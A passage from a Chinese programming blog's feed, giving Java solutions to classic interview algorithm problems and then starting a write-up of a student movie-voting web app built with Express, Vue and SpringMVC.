class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (listNode!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            stack.push(listNode.val);</span><br><span class="line">            listNode = listNode.next;</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty())&#123;</span><br><span class="line">            list.add(stack.pop());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重建二叉树"><a href="#重建二叉树" class="headerlink" title="重建二叉树"></a>重建二叉树</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列&#123;1,2,4,7,3,5,6,8&#125;和中序遍历序列&#123;4,7,2,1,5,3,8,6&#125;，则重建二叉树并返回。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for binary tree</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">reConstructBinaryTree</span><span class="params">(<span class="keyword">int</span>[] pre,<span class="keyword">int</span>[] in)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(pre.length == <span class="number">0</span>||in.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode node = <span class="keyword">new</span> TreeNode(pre[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; in.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pre[<span class="number">0</span>] == in[i])&#123;</span><br><span class="line">                node.left = reConstructBinaryTree(Arrays.copyOfRange(pre, <span class="number">1</span>, i+<span class="number">1</span>), Arrays.copyOfRange(in, <span class="number">0</span>, i));</span><br><span class="line">                node.right = reConstructBinaryTree(Arrays.copyOfRange(pre, i+<span class="number">1</span>, pre.length), Arrays.copyOfRange(in, i+<span class="number">1</span>,in.length));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用两个栈实现队列"><a href="#用两个栈实现队列" class="headerlink" title="用两个栈实现队列"></a>用两个栈实现队列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    Stack&lt;Integer&gt; stack1 = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">    Stack&lt;Integer&gt; stack2 = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> node)</span></span>&#123;</span><br><span class="line">        stack1.push(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!stack1.empty())&#123;</span><br><span class="line">            stack2.push(stack1.pop());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> first = stack2.pop();</span><br><span class="line">        <span class="comment">// 再压回来</span></span><br><span class="line">        <span class="keyword">while</span> (!stack2.empty())&#123;</span><br><span class="line">            stack1.push(stack2.pop());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="旋转数组的最小数字"><a href="#旋转数组的最小数字" class="headerlink" title="旋转数组的最小数字"></a>旋转数组的最小数字</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。</span><br><span class="line">输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。</span><br><span class="line">例如数组&#123;3,4,5,1,2&#125;为&#123;1,2,3,4,5&#125;的一个旋转，该数组的最小值为1。</span><br><span class="line">NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 二分法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minNumberInRotateArray</span><span class="params">(<span class="keyword">int</span>[] array)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> high = array.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = low;</span><br><span class="line">    <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">        <span class="keyword">if</span>(high - low == <span class="number">1</span>)&#123;</span><br><span class="line">            mid = high;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(array[mid] &gt;= array[low])&#123;</span><br><span class="line">            low = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(array[mid] &lt;= array[high])&#123;</span><br><span class="line">            high = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array[mid];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">大家都知道斐波那契数列，现在要求输入一个整数n，请你输出斐波那契数列的第n项。</span><br><span class="line">n&lt;=39</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Fibonacci</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] result = &#123;<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> result[n];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fibNMinuxOne = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> fibNMinuxTwo = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i &lt;= n;i++)&#123;</span><br><span class="line">        sum = fibNMinuxOne + fibNMinuxTwo;</span><br><span class="line">        fibNMinuxOne = fibNMinuxTwo;</span><br><span class="line">        fibNMinuxTwo = sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="互联网公司面试笔试题"><a href="#互联网公司面试笔试题" class="headerlink" title="互联网公司面试笔试题"></a>互联网公司面试笔试题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(2012年腾讯实习生笔试 加分题)</span><br><span class="line">给定一数组a[N]，我们希望构造数组b [N]，其中b[j]=a[0]*a[1]…a[N-1] / a[j]，在构造过程中，不允许使用除法：</span><br><span class="line"></span><br><span class="line">要求O（1）空间复杂度和O（n）的时间复杂度；</span><br><span class="line">除遍历计数器与a[N] b[N]外，不可使用新的变量（包括栈临时变量、堆空间和全局静态变量等）；</span><br><span class="line">实现程序（主流编程语言任选）实现并简单描述。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        b[0] = a[1] * a[2] * a[3] * a[4]</span></span><br><span class="line"><span class="comment">        b[1] = a[0] * a[2] * a[3] * a[4]</span></span><br><span class="line"><span class="comment">        b[2] = a[0] * a[1] * a[3] * a[4]</span></span><br><span class="line"><span class="comment">        b[3] = a[0] * a[1] * a[2] * a[4]</span></span><br><span class="line"><span class="comment">        b[4] = a[0] * a[1] * a[2] * a[3]</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> MAX = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] b = <span class="keyword">new</span> <span class="keyword">int</span>[MAX];</span><br><span class="line">        b[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"数组A:"</span>);</span><br><span class="line">        printArr(a,MAX);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        b[0] = 1</span></span><br><span class="line"><span class="comment">        b[1] = a[0]</span></span><br><span class="line"><span class="comment">        b[2] = a[0] * a[1]</span></span><br><span class="line"><span class="comment">        b[3] = a[0] * a[1] * a[2]</span></span><br><span class="line"><span class="comment">        b[4] = a[0] * a[1] * a[2] * a[3]</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; MAX;i++)&#123;</span><br><span class="line">            b[i] = b[i-<span class="number">1</span>] * a[i-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        b[4] = b[4] * b[0] = a[0]*a[1]*a[2]*a[3], b[0] = a[4]</span></span><br><span class="line"><span class="comment">        b[3] = b[3] * b[0] = a[0]*a[1]*a[2]*a[4], b[0] = a[4]*a[3]</span></span><br><span class="line"><span class="comment">        b[2] = b[2] * b[0] = a[0]*a[1]*a[3]*a[4], b[0] = a[4]*a[3]*a[2]</span></span><br><span class="line"><span class="comment">        b[1] = b[1] * b[0] = a[0]*a[2]*a[3]*a[4]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = MAX - <span class="number">1</span>;i &gt;= <span class="number">1</span>;i--)&#123;</span><br><span class="line">            b[i] *= b[<span class="number">0</span>];</span><br><span class="line">            b[<span class="number">0</span>] *= a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"数组B: "</span>);</span><br><span class="line">        printArr(b,MAX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printArr</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> MAX)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;MAX;i++)&#123;</span><br><span class="line">            System.out.print(arr[i]+<span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">构造回文</span><br><span class="line">题目描述</span><br><span class="line"></span><br><span class="line">给定一个字符串s，你可以从中删除一些字符，使得剩下的串是一个回文串。如何删除才能使得回文串最长呢？输出需要删除的字符个数。</span><br><span class="line">输入描述:输入数据有多组，每组包含一个字符串s，且保证:1&lt;=s.length&lt;=1000.</span><br><span class="line">输出描述:对于每组数据，输出一个整数，代表最少需要删除的字符个数。</span><br><span class="line">输入例子:</span><br><span class="line">abcdagoogle+</span><br><span class="line"></span><br><span class="line">输出例子:</span><br><span class="line">22</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in  = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">while</span> (in.hasNext())&#123;</span><br><span class="line">            String str = in.next();</span><br><span class="line">            String reStr = <span class="keyword">new</span> StringBuffer(str).reverse().toString();</span><br><span class="line">            <span class="keyword">char</span>[] c1 = str.toCharArray();</span><br><span class="line">            <span class="keyword">char</span>[] c2 = reStr.toCharArray();</span><br><span class="line">            <span class="keyword">int</span> n = str.length();</span><br><span class="line">            <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(c1[i] == c2[j])&#123;</span><br><span class="line">                        dp[i+<span class="number">1</span>][j+<span class="number">1</span>] = dp[i][j] + <span class="number">1</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        dp[i+<span class="number">1</span>][j+<span class="number">1</span>] = Math.max(dp[i][j+<span class="number">1</span>],dp[i+<span class="number">1</span>][j]);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(n - dp[n][n]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;先来首音乐吧！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;110&quot; src=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>前后分离之&quot;电影投票系统&quot;</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E5%89%8D%E5%90%8E%E5%88%86%E7%A6%BB%E4%B9%8B%22%E7%94%B5%E5%BD%B1%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%22/"/>
    <id>https://www.ycjcl.cc/2018/07/08/前后分离之&quot;电影投票系统&quot;/</id>
    <published>2018-07-07T17:16:22.000Z</published>
    <updated>2018-07-07T17:16:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="电影投票系统"><a href="#电影投票系统" class="headerlink" title="电影投票系统"></a>电影投票系统</h1><blockquote><p>Java课程设计，想试试前后端完全分离的开发(原来在Class+时曾体验过)，于是有了下面4天2人的开发历程。先上图吧！Github地址：<a href="https://github.com/ycjcl868/VoteApp" target="_blank" rel="noopener">https://github.com/ycjcl868/VoteApp</a>，Demo：<a href="http://movie.ycjcl.cc" target="_blank" rel="noopener">http://movie.ycjcl.cc</a></p></blockquote><p>前台投票页：</p><ul><li style="list-style: none"><input type="checkbox" checked> 查看电影列表</li><li style="list-style: none"><input type="checkbox" checked> 执行投票操作</li><li style="list-style: none"><input type="checkbox" checked> 查看一小时内的日志及日志数</li><li style="list-style: none"><input type="checkbox" checked> 数据统计图</li><li style="list-style: none"><input type="checkbox"> 搜索</li><li style="list-style: none"><input type="checkbox"> 投票成功分享</li></ul><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/1.gif" alt=""></p><p>后台管理：</p><ul><li style="list-style: none"><input type="checkbox" checked> 新增电影</li><li style="list-style: none"><input type="checkbox" checked> 删除电影</li><li style="list-style: none"><input type="checkbox" checked> 查看日志</li><li style="list-style: none"><input type="checkbox"> 修改电影</li><li style="list-style: none"><input type="checkbox"> 查看统计图</li></ul><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/2.gif" alt=""></p><h2 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>共用了两台腾讯云服务器(CentOS 7)，一台前端Node服务器和一台Java SpringMVC服务器，之前的交互通过<code>JSON</code>。通过前后分离，将<code>MVC</code>中的<code>View</code>和<code>Controller</code>层分给前端，后台<code>SpringMVC</code>负责<code>Model</code>层，只提供<code>JSON</code>数据，交互如图：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/架构图.png" alt=""></p><blockquote><p>看到这个架构，想起原来大一在Class+的困惑，问了孵化器里的很多人，都不能解决我的问题。我的问题是这样的，Class+的App和后台(也是Spring，JSON接口)是写好的，当时只会<strong>PHP</strong>且<strong>Node</strong>没这么流行。然后要做一个网站，接口要调用<strong>Spring</strong>写好的，然后把整个前端静态页面管理组织起来。当时的<strong>PHP</strong>就相当于现在的<strong>Node</strong>，只不过那时候的纯<strong>PHP</strong>发<strong>POST</strong>请求时真是麻烦(调用<strong>CURL</strong>一堆方法)。且那时候傻到直接将<strong>Java</strong>后台地址调到<strong>$.ajax(url)</strong>里，导致跨域问题，用<strong>JSONP</strong>，还让写后台<strong>Spring</strong>的越越修改<strong>Access-Control</strong>头，且返回的<strong>JSON</strong>数据有时还需要用<strong>‘(‘+eval(str)+’)’去处理一下</strong>。现在好了，直接<strong>Node</strong>前后一体化<strong>JS</strong>代码解决疑惑。</p></blockquote><h3 id="前端服务器"><a href="#前端服务器" class="headerlink" title="前端服务器"></a>前端服务器</h3><p>前端在数据层采用<code>Express</code>+<code>Vue</code>，UI 层前台使用腾讯手 Q的<a href="http://frozenui.github.io" target="_blank" rel="noopener">Frozenui</a>  + <a href="http://zeptojs.com" target="_blank" rel="noopener">Zepto</a> + <a href="http://layer.layui.com/mobile/" target="_blank" rel="noopener">LayerMobile</a> + <a href="http://canvasjs.com" target="_blank" rel="noopener">CanvasJS(这个我极力推荐,个人贡献了中文文档)</a>，后台管理使用<code>老油条组合</code> <a href="">jQuery</a> + <a href="http://v3.bootcss.com" target="_blank" rel="noopener">BootStrap</a> 。 整个前端使用<code>Gulp</code>进行自动化处理，配置见<a href="https://www.ycjcl.cc/2017/01/08/express-gulppei-zhi-gao-xiao-lu-kai-fa-huan-jing/">Express+Gulp配置高效率开发环境</a>。</p><h4 id="首页："><a href="#首页：" class="headerlink" title="首页："></a>首页：</h4><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/3.jpg" alt=""></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/1.png" alt=""></p><h4 id="日志页："><a href="#日志页：" class="headerlink" title="日志页："></a>日志页：</h4><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/2.png" alt=""></p><h4 id="数据统计页："><a href="#数据统计页：" class="headerlink" title="数据统计页："></a>数据统计页：</h4><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/0.png" alt=""></p><h4 id="后台页面"><a href="#后台页面" class="headerlink" title="后台页面"></a>后台页面</h4><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/5.png" alt=""></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/10.png" alt=""></p><h4 id="信息安全"><a href="#信息安全" class="headerlink" title="信息安全"></a>信息安全</h4><p>对传输数据进行了加密处理：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行投票操作(POST)</span></span><br><span class="line"><span class="comment"> * @param userIP 用户ip</span></span><br><span class="line"><span class="comment"> * @param token  用户唯一标识加密(ip+'xxxx').md5()</span></span><br><span class="line"><span class="comment"> * @param cineId 电影id</span></span><br><span class="line"><span class="comment"> * @param province  省份</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回：state // 状态或票数</span></span><br><span class="line"><span class="comment"> *      cineId // 电影id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">router.post(<span class="string">'/doVote'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> params = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> send = res;</span><br><span class="line">    params.userIP = req.session.ip;</span><br><span class="line">    params.token = api.cryptoToken(req.session.ip);</span><br><span class="line">    params.cineId = req.body.cineId;</span><br><span class="line">    <span class="comment">// 通过百度接口用 ip 获得省份</span></span><br><span class="line">    api.getProvince(req.session.ip,<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        params.province = res;</span><br><span class="line">        <span class="built_in">console</span>.log(params);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行投票操作</span></span><br><span class="line">        api.doVote(params,<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(res);</span><br><span class="line">            send.send(res);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后后台Java拿到<code>ip</code>后，对<code>ip</code>进行加密然后判断是否等于前端传来的<code>token</code>来执行投票操作。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/11.png" alt=""></p><h4 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h4><p>首次在项目中使用<code>localStorage</code>的新特性，存储了是否投过票<code>voteId</code>和投票时间<code>voteTime</code>。来前端控制一个小时内只能投票一次(当然后台 Java 也得控制呢~)。当<code>Vue</code>到<code>ready</code>生命周期时就判断：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> currentTime = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span><br><span class="line"><span class="keyword">var</span> voteTime = localStorage.getItem(<span class="string">'voteTime'</span>);</span><br><span class="line"><span class="comment">// console.log('currentTime'+currentTime);</span></span><br><span class="line"><span class="comment">// console.log('voteTime'+voteTime);</span></span><br><span class="line"><span class="comment">// console.log(currentTime - voteTime &gt;= 3600000);</span></span><br><span class="line"><span class="keyword">if</span>(currentTime - voteTime &gt;= <span class="number">3600000</span>)&#123;</span><br><span class="line"><span class="comment">// 一个小时后，就可以投票了(实际上是可以向 Java 发请求了)</span></span><br><span class="line">localStorage.setItem(<span class="string">'voteId'</span>,<span class="string">'-1'</span>);</span><br><span 